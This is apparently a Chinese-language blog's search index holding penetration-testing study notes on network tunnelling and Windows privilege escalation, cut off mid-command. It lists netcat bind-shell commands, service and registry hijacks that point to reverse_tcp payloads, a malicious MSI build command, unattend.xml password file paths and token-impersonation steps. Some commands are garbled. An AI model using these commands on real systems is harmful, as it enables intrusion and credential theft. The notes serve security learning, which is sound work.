<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>内网学习</title>
      <link href="/2023/02/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/02/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="转发和代理"><a href="#转发和代理" class="headerlink" title="转发和代理"></a>转发和代理</h1><h2 id="端口转发和代理"><a href="#端口转发和代理" class="headerlink" title="端口转发和代理"></a>端口转发和代理</h2><h3 id="正向和反向连接"><a href="#正向和反向连接" class="headerlink" title="正向和反向连接"></a>正向和反向连接</h3><p>正向连接 <strong>攻击主动连接</strong>受控机   </p><p>要求 <strong>两机器都有公网ip</strong></p><p>问题 1.受防火墙限制 2.存在权限不足问题 3.受控机无公网ip连不了</p><p>反向连接 <strong>受控机主动反向连接</strong>攻击机</p><p>好处 ：突破 正向连接的B问题</p><span id="more"></span><h3 id="端口转发和映射"><a href="#端口转发和映射" class="headerlink" title="端口转发和映射"></a>端口转发和映射</h3><p>端口转发 一个端口收到的数据-另一个网络端口 端口可以是本机也可以是其他主机</p><p>端口映射 把外网主机请求映射到内网主机 使得没有公网ip的内网主机能对外提供服务 </p><p>并没有严格属于解释 有时一并谈论</p><h3 id="SOCKS代理"><a href="#SOCKS代理" class="headerlink" title="SOCKS代理"></a>SOCKS代理</h3><p>标准端口1080 有socks4和5两版本 </p><p>4和5的区别 4只支持tcp 5还支持udp和各种身份验证 </p><p>内网渗透可以搭建socks代理 与目标内网主机通信</p><h2 id="常见转发代理工具"><a href="#常见转发代理工具" class="headerlink" title="常见转发代理工具"></a>常见转发代理工具</h2><h4 id="lcx"><a href="#lcx" class="headerlink" title="lcx"></a>lcx</h4><p>内网端口转发工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">一：</span><br><span class="line">lcx.exe -tran 4444 127.0.0.1 3389(情景：3389禁止访问，工具把3389转发到4444上去访问，需要目标机器有公网ip)</span><br><span class="line">二：</span><br><span class="line">lcx.exe -tran 2222 10.10.10.15 22(情景 15机为内网机 只能和取得shell的12机相通，则在12机上执行此命令 将内网15机器的22端口转发到12机上的2222端口)(端口映射)</span><br><span class="line">三：</span><br><span class="line">vps：./lcx -listen 4444 8888(情景 此命令作用与vps 内网主机没有公网ip通过其他方式取得了shell  然后用内网机连接vps 使其8888收到的数据转给4444)</span><br><span class="line">内网机：lcx.exe -slave 192.168.2.x 8888 127.0.0.1 3389 </span><br><span class="line">再通过访问vps的4444端口访问到内网机的远程桌面</span><br><span class="line">攻击机：rdesktop 192.168.2.x:4444</span><br></pre></td></tr></table></figure><h4 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h4><p>内网穿透 高性能反向代理 支持tcp/udp/http/https等 常用隧道工具 支持搭建socks5代理应用</p><p>win和linux双系统 包括 frps frps.ini frpc frpc.ini 服务端客户端程序及配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">frps.ini</span><br><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0</span><br><span class="line">bind_port = 7000</span><br><span class="line">frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr = 192.168.2.x</span><br><span class="line">sever_port = 7000</span><br><span class="line">[socks5]</span><br><span class="line">remote_port = 1080</span><br><span class="line">plugin = socks5</span><br><span class="line">简单理解 frps=vps端  frpc为受控机</span><br><span class="line">受控机的1080端口将流量转发至vps的7000端口</span><br><span class="line">后续  使用proxifier或者 proxychains 配置写192.168.2.x主机 端口写1080就可以</span><br></pre></td></tr></table></figure><h4 id="nps"><a href="#nps" class="headerlink" title="nps"></a>nps</h4><p>外网机器服务端 安装后注意 端口 开放</p><p>tcp穿透</p><p>socks5 +proxfier</p><p>被转发的机器   敲命令  客户端有</p><p><img src="image-20230208180131246.png" alt="image-20230208180131246"></p><p>主要问题  注意vps端口和安全组  宝塔和云平台都要开</p><h3 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a>ICMP隧道</h3><p>在一般通信过程中，如果两台设备需要进行通信，肯定要开放端口，但是<code>ICMP</code>协议就不需要。最常见的ICMP消息为<code>ping</code>命令回复，攻击者可以利用命令行得到比回复更多的ICMP请求。</p><p><strong>工具：</strong></p><ul><li><code>icmpsh</code>、<code>PingTunnel</code>、<code>icmptunnel</code>、<code>powershell icmp</code></li></ul><h4 id="icmpsh使用"><a href="#icmpsh使用" class="headerlink" title="icmpsh使用"></a>icmpsh使用</h4><ul><li><code>git clone https://github.com/inquisb/icmpsh.git</code> 下载工具</li><li><code>pip2 install impacket</code> 下载包依赖</li><li><code>sysctl -w net.ipv4.icmp_echo_ignore_all=1</code> 关闭icmp回应</li><li><code>python2 icmpsh_m.py &lt;攻击机IP&gt; &lt;目标机器IP&gt;</code></li><li>执行结果会在攻击机回连一个shell</li></ul><h4 id="PingTunnel使用"><a href="#PingTunnel使用" class="headerlink" title="PingTunnel使用"></a>PingTunnel使用</h4><p>局限：中转服务器一定要是Linux</p><p>解决局限：<a href="https://blog.csdn.net/markecheng/article/details/110352161?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-4.pc_relevant_antiscanv2&amp;spm=1001.2101.3001.4242.3&amp;utm_relevant_index=7">https://blog.csdn.net/markecheng/article/details/110352161?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-4.pc_relevant_antiscanv2&amp;spm=1001.2101.3001.4242.3&amp;utm_relevant_index=7</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装libpacap环境依赖</span></span><br><span class="line">apt-get install byacc</span><br><span class="line">apt-get install flex bison</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装libpcap依赖库</span></span><br><span class="line">wget http://www.tcpdump.org/release/libpcap-1.9.0.tar.gz</span><br><span class="line">tar -xzvf libpcap-1.9.0.tar.gz</span><br><span class="line"><span class="built_in">cd</span> libpcap-1.9.0</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装PingTunnel</span></span><br><span class="line">wget http://www.cs.uit.no/~daniels/PingTunnel/PingTunnel-0.72.tar.gz</span><br><span class="line">tar -xzvf PingTunnel-0.72.tar.gz</span><br><span class="line"><span class="built_in">cd</span> PingTunnel</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在Linux的 web服务器上操作</span></span><br><span class="line">ptunnel -x &lt;连接密码&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在攻击上的操作</span></span><br><span class="line">ptunnel -p &lt;流量转发服务的iP&gt; -lp &lt;本地监听的端口&gt; -da &lt;转发的目标机器的IP&gt; -dp &lt;转发的目标机器的端口&gt; -x &lt;连接密码&gt;</span><br></pre></td></tr></table></figure><h4 id="防御ICMP隧道"><a href="#防御ICMP隧道" class="headerlink" title="防御ICMP隧道"></a>防御ICMP隧道</h4><ul><li>检测同一来源的ICMP数据包的数量。使用ICMP隧道在短时间产生大量数据包</li><li>注意那些Payload大于64bit的ICMP数据包</li><li>寻找响应和请求不一致的数据包</li><li>检查ICMP数据包的协议标签</li></ul><h3 id="IPV6隧道"><a href="#IPV6隧道" class="headerlink" title="IPV6隧道"></a>IPV6隧道</h3><p>IPV6隧道就是值通过IPV4隧道传送IPV6数据报文的技术。</p><p><strong>工作原理：</strong></p><p><img src="image-20220401202743562.png" alt="image-20220401202743562"></p><ol><li>节点A要想节点B发送IPV6报文，首先需要在节点A和节点B之间建立一条隧道</li><li>A将IPV6报文封装在以节点B的IPV4地址为目的地址、以自己的IPV4地址为源地址的IPV4报文中，并发往IPV4海洋</li><li>在IPV4海洋中，这个报文和普通报文一样，经过IPV4转发到达节点B</li><li>节点B接受到之后，接触IPV4封装，取出其中的IPv6报文</li></ol><p><strong>绕过原理：</strong></p><p>因为现阶段的边界设备，防火墙甚至入侵防御系统还无法识别IPv6的通信数据，而大多数的操作系统支持IPv6。攻击者有时会通过恶意软件来配置允许进行IPv6通信的设备，以避开防火墙和入侵检测系统。<strong>及时设备支持IPv6，也有可能无法正确分析封装了IPv6报文的IPv4数据包</strong></p><p><strong>工具：</strong></p><ul><li><code>socat</code> 、<code>6tunnel</code>、<code>nt6tunnel</code></li></ul><p><strong>防御：</strong> 过滤<code>IPv6</code>协议通信</p><h3 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h3><h4 id="抓取Banner信息"><a href="#抓取Banner信息" class="headerlink" title="抓取Banner信息"></a>抓取Banner信息</h4><ul><li><code>nc -nv &lt;目标IP&gt; &lt;目标端口&gt;</code></li></ul><h4 id="指定端口的扫描"><a href="#指定端口的扫描" class="headerlink" title="指定端口的扫描"></a>指定端口的扫描</h4><ul><li><p><code>nc -v &lt;目标IP&gt; &lt;目标端口&gt;</code></p></li><li><p><code>nc -vz &lt;目标iP&gt; &lt;端口-端口&gt;</code> （巨慢）</p></li></ul><h4 id="端口监听"><a href="#端口监听" class="headerlink" title="端口监听"></a>端口监听</h4><ul><li><code>nc -lp 9999</code></li><li>当端口被访问时信息会输出到控制台</li></ul><h4 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h4><ul><li><code>nc -lvvp 2233 &gt;1.txt</code>  监听本地2233，当有数据 输入到 1.txt</li><li><code>nc -vn &lt;目标IP&gt; &lt;目标端口&gt; &lt;2.txt</code>  把2.txt文件内容传输到目标的指定端口</li></ul><h4 id="简易聊天"><a href="#简易聊天" class="headerlink" title="简易聊天"></a>简易聊天</h4><ul><li><code>nc -lp 2233</code></li><li><code>nc -vn &lt;目标IP&gt; &lt;指定端口&gt;</code></li></ul><h4 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h4><p><strong>正向：</strong>(攻击机连接目标机器，目标机器启动监听)</p><ul><li><code>nc -lvvp 2233 -e /bin/sh</code>   Linux</li><li><code>nc -lvvp 2233 -e C:\windows\system32\cmd.exe</code>  Windows</li></ul><p><strong>反向</strong>：(攻击机开启监听，目标机器使用反弹shell命令进行回连)</p><h3 id="HTTP-HTTPS隧道"><a href="#HTTP-HTTPS隧道" class="headerlink" title="HTTP/HTTPS隧道"></a>HTTP/HTTPS隧道</h3><p>就是通过上传web上传的脚本文件，将流量转发到内网。</p><h3 id="DNS隧道"><a href="#DNS隧道" class="headerlink" title="DNS隧道"></a>DNS隧道</h3><h5 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h5><p>在进行DNS查询时，如果查询的域名不在DNS服务器本机的缓存中，就会互联网进行查询，然后返回结果。如果在互联网上有一台定制的服务器，那么依靠DNS协议即可进行数据包的交换。从DNS协议的角度来看：这样的操作只是在一次次查询某个特定的域名并得到解析结果。</p><p>在使用DNS隧道与外部进行通信时，从表面上看没有连接到外网的（内网网关没有转发IP数据包），但实际上，内网的DNS服务器进行了中转操作。</p><h5 id="DNS解析配置"><a href="#DNS解析配置" class="headerlink" title="DNS解析配置"></a>DNS解析配置</h5><p><img src="image-20220402133307572.png" alt="image-20220402133307572"></p><p>第一条A类记录，告诉域名系统，”dns.xxx.com”的IP地址是”121.xxx.xxx.xxx”</p><p>第二条NS记录，告诉域名系统，”dns2tcp.xxx.com”的域名由”dns.xxx.com”进行解析。</p><p>最后这条”dns2tcp.xxx.com”的DNS就会被”121.xxx.xxx.xxx”的主机(也就是我们的VPS)，给解析掉。</p><p>配置完之后，可以ping一下dns.xxx.com，观察是否能ping通。</p><h5 id="iodine"><a href="#iodine" class="headerlink" title="iodine"></a>iodine</h5><ul><li>vps 安装 iodine</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install iodine</span><br></pre></td></tr></table></figure><ul><li>在VPS上运行iodine的服务端iodined</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">iodined -f -c -P husins 192.168.0.1 dns2tcp.xxx.com -DD</span><br><span class="line"> </span><br><span class="line"> <span class="comment">#-f：在前台运行</span></span><br><span class="line"> <span class="comment">#-c：禁止检查所有传入请求的客户端IP地址。</span></span><br><span class="line"> <span class="comment">#-P：客户端和服务端之间用于验证身份的密码。</span></span><br><span class="line"> <span class="comment">#-D：指定调试级别，-DD指第二级。“D”的数量随级别增加。</span></span><br><span class="line"> <span class="comment">#这里的192.168.0.1为自定义局域网虚拟IP地址，建议不要与现有网段冲突</span></span><br><span class="line"> <span class="comment">#注意填写的地址为NS记录</span></span><br></pre></td></tr></table></figure><ul><li>在目标主机执行</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">iodine -f -P h dns2tcp.xxx.com  -M 200</span><br><span class="line"></span><br><span class="line"><span class="comment">#-r：iodine有时会自动将DNS隧道切换为UDP隧道，该参数的作用是强制在任何情况下使用DNS隧道</span></span><br><span class="line"><span class="comment">#-M：指定上行主机的大小。</span></span><br><span class="line"><span class="comment">#-m：调节最大下行分片的大小。</span></span><br><span class="line"><span class="comment">#-f：在前台运行</span></span><br><span class="line"><span class="comment">#-T：指定DNS请求类型TYPE，可选项有NULL、PRIVATE、TXT、SRV、CNAME、MX、A。</span></span><br><span class="line"><span class="comment">#-O：指定数据编码规范。</span></span><br><span class="line"><span class="comment">#-P：客户端和服务端之间用于验证身份的密码。</span></span><br><span class="line"><span class="comment">#-L：指定是否开启懒惰模式，默认开启。</span></span><br><span class="line"><span class="comment">#-I：指定两个请求之间的时间间隔。</span></span><br></pre></td></tr></table></figure><h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="Windows权限描述"><a href="#Windows权限描述" class="headerlink" title="Windows权限描述"></a>Windows权限描述</h2><ul><li><code>User</code>: 普通用户权限，是系统中最安全的权限，因为分配给该组的默认权限不允许成员修改操作系统的设置和用户资料</li><li><code>Administrtor</code>: 管理员权限，可以利用Windows的机制将自己提升为<code>system</code>权限，以操作SAM文件等</li><li><code>system</code>：系统权限，可以对SAM等敏感文件进行读取，往往需要将<code>Administrator</code>权限提升到System权限才可以对散列值进行dump操作</li><li><code>TrustedInstaller</code>: windows 最高权限。对文件系统，即使拥有System权限也无法进行修改，只有拥有TrustedInstall权限的用户才可以修改系统文件</li></ul><h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><p><strong>原理：</strong>程序缓冲区的大小是事先设置好的，如果用户输入的数据的大小超过了缓存区的大小，程序就会溢出，攻击者使用该方法可以绕过系统的所有安全限制，利用该漏洞的关键是目标系统没有及时安装补丁。</p><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><ul><li><p><code>whoami /groups</code> 获取当前权限的等级</p></li><li><p><code>systeminfo</code> 查看系统补丁</p></li><li><p><code>wmic qfe get caption,description,hotfixid,installedon</code></p></li><li><p><strong>-使用wes-ng</strong> (Windows Exploit Suggester)</p></li></ul><p><img src="image-20230312211834370.png" alt="image-20230312211834370"></p><p><code>wes sysinfo.txt --impact &quot;Elevation of Privilege&quot; </code></p><p><code>wes sysinfo.txt --impact &quot;Elevation of Privilege&quot; --exploits-only </code></p><ul><li><strong>msf</strong> </li></ul><p>local_exploit_suggester： 提供了各种可用于提权的local exploits，并会基于架构，平台（即运行的操作系统），会话类型和所需默认选项提供建议</p><p>enum_patches ：据漏洞编号快速找出系统中缺少的补丁</p><ul><li><strong>sherlock 脚本</strong> <a href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a></li></ul><p>1 输入Import-Module .\Sherlock.ps1导入脚本<br>2 输入Find-AllVulns 扫描</p><ul><li><a href="https://github.com/SecWiki/windows-kernel-exploits">常见EXP</a></li><li><code>Cobalt Strike 3.6</code> 新增了<code>elevate</code>功能。</li><li><a href="http://bugs.hacking8.com/tiquan/">在线提权辅助</a></li></ul><h2 id="系统服务提权"><a href="#系统服务提权" class="headerlink" title="系统服务提权"></a>系统服务提权</h2><p><code>Windows</code>系统服务在操作系统启动时加载和执行，并在后台调用可执行文件。因此，如果一个低权限的用户对此类系统服务调用的可执行文件拥有写权限，就可以将该文件替换成任意可执行文件，并随着系统服务的启动获得系统权限。<code>Windows</code>服务是以<code>System</code>权限运行的，因此，其文件夹、文件和注册表键值都是受强访问控制机制保护的。但是在某些情况下，操作系统中仍然存在一些没有得到有效保护的服务</p><p>有以下两种利用方式：</p><ul><li>服务未运行：攻击者会使用任意服务来替换原来的服务，然后重启服务</li><li>服务正在运行且无法终止：这种情况符合绝大多数的漏洞利用场景，攻击者会利用DLL劫持并尝试重启服务来提权</li></ul><p>攻击手法</p><ul><li><code>PowerUp.ps1</code>脚本的<code>Invoke-Checks</code>模块</li><li><code>MSF</code>的<code>service_permissions</code>模块<ul><li>该模块使用两种方式获取<code>system</code>权限：如果<code>meterpreter</code>以管理员权限运行，该模块会尝试创建并运行一个新的服务；如果当前权限不允许创建服务，该模块会判断那些服务的文件或者文件夹存在权限问题，并允许对其劫持。</li></ul></li></ul><h3 id="不安全的服务权限"><a href="#不安全的服务权限" class="headerlink" title="不安全的服务权限"></a>不安全的服务权限</h3><p>一些以system权限启动的应用，如果让其启动时执行其他程序 就可获得系统权限</p><p><strong>AccessChk</strong> 枚举主机上存在系统缺陷的系统服务</p><p>各种方式查找到后使用<code>sc config xxxx binpath（指定的二进制文件路径）= &quot;cmd.exe(要改的高权系统程序)&quot; /k &quot;C:\Users\Public\reverse_tcp.exe&quot;(需要系统权限的马什么的)等号后必须有一个空格</code></p><p>如果有重启服务权限可以直接<code>sc stop &lt;service&gt;</code>      <code>sc start &lt;service&gt;</code>重启如果 没权限 就重启开机吧</p><h3 id="服务注册表权限脆弱"><a href="#服务注册表权限脆弱" class="headerlink" title="服务注册表权限脆弱"></a>服务注册表权限脆弱</h3><p>注册表ACL配置错误 低权用户对服务的注册表有写入权限 通过修改注册表更改服务配置</p><p><code>accesschk.exe /acceptula -uvwqk &quot;Authenticated Users&quot; HKLM\SYSTEM\CurrentControlSet\Services</code> 枚举 Authenticated Users用户组具有写入权限的服务注册表</p><p>以下命令将xyz服务注册表种的ImagePath指向预先上传的攻击载荷</p><p><code>reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\xyz /v Imagepath /t</code></p><p><code>REG_EXPAND_SZ /d &quot;cmd.exe /k C:\Users\Public\reverse_tcp.exe&quot; /f</code></p><p>检测用户对服务有无重启权限</p><p><code>accesschk.exe /acceptula -ucqv &quot;Authenticated Users&quot; xyz</code></p><h3 id="服务路径权限可控"><a href="#服务路径权限可控" class="headerlink" title="服务路径权限可控"></a>服务路径权限可控</h3><p>主机用户存在错误配置或操作 使得低权用户对其调用的二进制文件或所在目录有写入权限 可以将文件换成攻击载荷</p><p>查看InexeSvc服务的二进制文件所在目录是否有写入权限</p><p><code>accesschk.exe /acceptula -quv &quot;C:\Program Files\Insecure Executables\&quot;</code></p><p>如果有 可以备份原来二进制文件 并上传同名的 攻击载荷 随着服务重启 继承系统权限</p><h3 id="未引用服务路径"><a href="#未引用服务路径" class="headerlink" title="未引用服务路径"></a>未引用服务路径</h3><p>Windows文件解析特性 启动执行二进制文件路径种包含空格 未能有效包含在引号里</p><p>执行命令 枚举目标主机所有该漏洞</p><p><code>wmic service get DisplayName, PathName, StartMode|findstr /i /v &quot;C:\Windows\\&quot; |findstr/i /v &quot;&quot;&quot;</code></p><p><img src="image-20230313140448452.png" alt="image-20230313140448452"></p><p>结果知 用accesschk检查受影响目录 发现有当前用户对目录有完全控制权限</p><p><img src="image-20230313142216754.png" alt="image-20230313142216754"></p><p>此时可以想目录上传一个  Sub.exe载荷 服务重启后 检查到  、/xxx/xxx/Sub.exe会 以system权限执行</p><p>为避免漏洞 使用sc创建系统服务 应有效对存在空格的服务路径使用引号包裹</p><p>example<code>sc create TestSvc binpath= &quot;\&quot;C&quot;\Program Files\Sub Dir\Program Name.exe\&quot;&quot;</code></p><ul><li>icacls “C:\program Files\program folder”` 查看文件权限</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Everyone: 用户对这个文件夹有完全控制权限</span><br><span class="line">M：修改</span><br><span class="line">F：完全控制</span><br><span class="line">CI：从属容器将继承访问控制项</span><br><span class="line">OI：从属文件将继承访问控制项</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sc stop service_name //停止服务</span><br><span class="line">sc start service_name //启动服务</span><br></pre></td></tr></table></figure><ul><li>可以使用<code>MSF</code>的<code>Windows Service Trusted Path Privilege Escalation</code>模块</li></ul><h3 id="自动安装配置文件"><a href="#自动安装配置文件" class="headerlink" title="自动安装配置文件"></a>自动安装配置文件</h3><p>网络管理员在内网中给多台机器配置同一个环境时，通常会使用脚本批量部署，在这一过程中，会使用安装配置文件。这些文件包含所有的安装配置信息，其中的一些还有可能包含本地管理员账号和密码等信息。这些文件包含但不限于：</p><ul><li>C:\sysprep.inf</li><li>C:\sysprep\sysprep.inf</li><li>C:\Windows\system32\sysprep.inf</li><li>C:\Windows\system32\sysprep\sysprep.xml</li><li>C:\unattend.xml</li><li>C:\Windows\Panther\Unattend.xml</li><li>C:\Windows\Panther\Unattended.xml</li><li>C:\Windows\Panther\Unattend\Unattended.xml</li><li>C:\Windows\Panther\Unattend\Unattend.xml</li><li>C:\Windows\System32\Sysprep\unattend.xml</li><li>C:\Windows\System32\Sysprep\Panther\unattend.xml</li></ul><p>里面大概率包含明文密码或者经过Base64加密的密码</p><p><code>MSF</code>的<code>post/windwos/gather/enum_unattend</code>模块集成</p><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><ul><li><code>schtasks /query /fo LIST /v</code> 查看计算机所有的计划任务</li><li>如果攻击者对以高权限运行的任务所在的目录具有写权限，就可以使用恶意程序覆盖原来的程序。这样在计划任务下次执行时，就会以高权限来运行恶意程序</li></ul><h3 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h3><p><a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp">https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp</a></p><p>暂时不会用  这玩意要和powershell一块用  </p><h2 id="MSI安装策略提权"><a href="#MSI安装策略提权" class="headerlink" title="MSI安装策略提权"></a>MSI安装策略提权</h2><p>配置策略时   启用了永远以高特权进行安装（AlwaysInstallElevated 默认是禁用）使得任何权限用户都可以使用SYSTEM权限安装MSI程序     MSI=Microsoft Installer 微软格式应用程序安装包</p><p>在“运行”设置框中输入“gpedit.msc”，打开组策略编辑器</p><ul><li><p>组策略——计算机配置——管理模板——Windows 组件——Windows Installer —— 永远以高特权进行安装</p></li><li><p>组策略——用户配置——管理模板——Windows 组件——Windows Installer —— 永远以高特权进行安装</p></li></ul><h3 id="确定是否存在"><a href="#确定是否存在" class="headerlink" title="确定是否存在"></a>确定是否存在</h3><p>注册表以下两位置 键值为 1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\windows\Installer\AlwaysInstallElevated</span><br><span class="line">HKEY_CURRENT_MACHINE\SOFTWARE\Policies\Microsoft\windows\Installer\AlwaysInstallElevated</span><br></pre></td></tr></table></figure><p>测试命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br></pre></td></tr></table></figure><p><img src="image-20230313144920402.png" alt="image-20230313144920402"></p><p>如果没配置过 就是  <img src="image-20230313144947426.png" alt="image-20230313144947426"></p><h3 id="创建恶意MSI并安装"><a href="#创建恶意MSI并安装" class="headerlink" title="创建恶意MSI并安装"></a>创建恶意MSI并安装</h3><p>使用 msf <code>msfconsole - p windows/meterpreter/reverse_tcp LHOST=4444 -f msi -o reverse_tcp.msi</code></p><p><code>msiexec /q /i reverse_tcp.msi</code></p><h3 id="执行MSI文件命令"><a href="#执行MSI文件命令" class="headerlink" title="执行MSI文件命令"></a>执行MSI文件命令</h3><ul><li><code>msiexec /q /i UserAdd.msi</code></li><li><code>/quite</code>: 在安装过程中禁止像用户发送消息</li><li><code>/qn</code>: 不适用GUI，无GUI模式允许</li><li><code>/i</code>: 安装程序 常规安装</li></ul><h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><ul><li><code>PowerUp.ps1</code>的<code>RegistryAlwaysInstallElevated</code>和<code>Write-UserAddMSI</code>模块</li><li><code>MSF</code>的<code>exploiexploit/windows/local/always_install_elevated</code>模块</li></ul><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>禁用注册表键<code>AlwaysInstallElevated</code>，就可以组织攻击者通过MSI文件进行提权</p><h2 id="访问令牌操作"><a href="#访问令牌操作" class="headerlink" title="访问令牌操作"></a>访问令牌操作</h2><p><strong>令牌特点：</strong></p><ul><li>除非系统重启，这些令牌将持续存在于系统中</li><li>令牌的最大特点时是随机性和不可预测性</li><li>伪造令牌攻击的核心是Kerberos协议</li></ul><p><strong>令牌类型：</strong></p><ul><li>授权令牌（Delegation Tokens）：它支持交互式登录，例如远程登录和访问</li><li>模拟令牌（Impersonation Tokens）：它支持非交互式会话</li></ul><p>windows访问控制模型 由访问令牌 和安全描述符两部分组成   </p><p>访问令牌 登陆验证通过就会创建一个令牌 包括SID和本地安全策略分配给用户和用户属安全组的特权列表 此后每个进程都有此令牌的副本</p><p>win中令牌分为主令牌和模拟令牌 主令牌和进程关联</p><p>通过操纵访问令牌 使正在运行的进程看起来是其他进程的子进程或属于吉他用户启动的进程 常常使用内置Windows API从指定进程赋值访问令牌 并将得到的访问令牌用于现有进程或生成新进程 达到权限提升并绕过访问控制的目的  成为 令牌窃取 </p><p>令牌窃取只能在特权用户上下文才能完成 通过令牌创建进程用的<code>CreateProcessWithTokenW</code>和<code>CreateProcessAsUserA</code>两个API分别要求用户有 <code>SeImpersonatePrivilege</code>和<code>SeAssignPrimaryTokenPrivilege/SeIncreaseQuotaPrivilege</code>特权</p><p>拥有此2特权的一般为系统管理员 网络服务 和系统服务账户 （如IIS MSSQL等）</p><p>令牌窃取</p><p>如果已经存在<code>meterpreter shell</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usr incognito  </span><br><span class="line">list_tokens -u <span class="comment"># 列出可用令牌</span></span><br><span class="line">impersonate_token 主机名\\用户名</span><br></pre></td></tr></table></figure><p>如果目标系统中存在有效的令牌，可以通过Rotten Potato，实现权限提升</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">upload roottenpotato.exe</span><br><span class="line">excute _HC -f roottenpotato.exe</span><br><span class="line">impersonate_token <span class="string">&quot;NT AUTHORITY\\SYSTEM&quot;</span></span><br></pre></td></tr></table></figure><p>添加域管理员提权</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 前提获得域管理员进程</span></span><br><span class="line">ps <span class="comment"># 查看当前进程</span></span><br><span class="line">migrate <span class="comment"># 迁移到域管理员进程</span></span><br><span class="line">shell <span class="comment"># 进入命令行界面</span></span><br><span class="line">net user &lt;用户名&gt; 